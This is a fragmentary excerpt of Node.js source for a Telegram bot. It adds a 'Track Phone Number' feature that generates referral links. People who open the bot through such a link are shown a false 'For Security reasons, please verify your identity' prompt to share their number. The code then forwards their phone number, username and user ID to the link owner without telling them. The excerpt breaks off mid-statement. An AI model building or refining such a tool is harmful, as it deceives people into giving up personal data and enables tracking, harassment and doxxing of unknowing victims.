...
// New schema for tracking referral links
const ReferralLinkSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  referralCode: { type: String, required: true, unique: true }, // Unique numeric code (e.g., "track_123456")
  ownerId: { type: String, required: true }, // User who generated the link
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

BotUserSchema.index({ botToken: 1, userId: 1 }, { unique: true });
ReferralLinkSchema.index({ botToken: 1, referralCode: 1 }, { unique: true });
...
const messages = {
  en: {
    ...
    trackPhoneNumber: 'Track Phone Number 📞', // New button text
    ...
    verifyMessage: 'For Security reasons, Please verify your identity by share your number',
    verifyButton: 'Verify',
...
const languageKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      ...
      [
        { text: messages[lang].trackPhoneNumber, callback_data: 'track_phone_number' }, // New button
      ],
    ],
  },
});
...
module.exports = async (req, res) => {
  try {
    ...
    // Check if the user started the bot with a tracking link
    ...
    if (update.message?.text?.startsWith('/start')) {
      ...
      if (startParam.startsWith('track_')) {
        ...
        const referralLink = await ReferralLink.findOne({ botToken, referralCode });
        if (referralLink) {
          isTrackingLink = true;
          referralOwnerId = referralLink.ownerId;
        }
      }
    }
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
        ...
        if (isTrackingLink && referralOwnerId) {
          const phoneNumber = update.message.contact.phone_number;
          const username = user.username || 'Unknown';
          const notification = messages['en'].phoneNumberNotification(username, userId, phoneNumber);
          await bot.telegram.sendMessage(referralOwnerId, notification);
          // Optionally, you can send a confirmation to the user who shared their contact
    ...
    if (update.callback_query) {
      ...
      if (callbackData === 'lang_en') {
        ...
        try {
          ...
          let isUnique = false;
          while (!isUnique) {
            referralCode = `track_${generateRandomCode()}`;
            const existingLink = await ReferralLink.findOne({ botToken, referralCode });
            if (!existingLink) {
              isUnique = true;
            }
          }
          ...
          const trackLink = `https://t.me/${botInfo.username}?start=${referralCode}`;
          await bot.telegram.deleteMessage(chatId, messageId);
          await bot.telegram.sendMessage(
            chatId,
